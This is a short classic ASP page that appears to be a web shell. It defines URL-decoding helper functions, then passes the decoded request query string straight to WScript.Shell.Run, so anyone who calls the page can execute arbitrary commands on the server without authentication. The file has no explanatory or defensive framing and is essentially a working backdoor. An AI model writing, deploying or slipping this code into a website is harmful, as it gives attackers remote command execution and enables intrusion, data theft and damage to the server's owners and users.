<%Function URLDecode(str) 
        str = Replace(str, "+", " ") 
        For i = 1 To Len(str) 
            sT = Mid(str, i, 1) 
            If sT = "%" Then 
                If i+2 < Len(str) Then 
                    sR = sR & _ 
                        Chr(CLng("&H" & Mid(str, i+1, 2))) 
                    i = i+2 
                End If 
            Else 
                sR = sR & sT 
            End If 
        Next 
        URLDecode = sR 
    End Function 
 
    Function URLEncode(str) 
        URLEncode = Server.URLEncode(str) 
    End Function 
 

Set WShell = CreateObject("WScript.Shell")
Call WShell.Run (URLDecode(Request.QueryString))
%>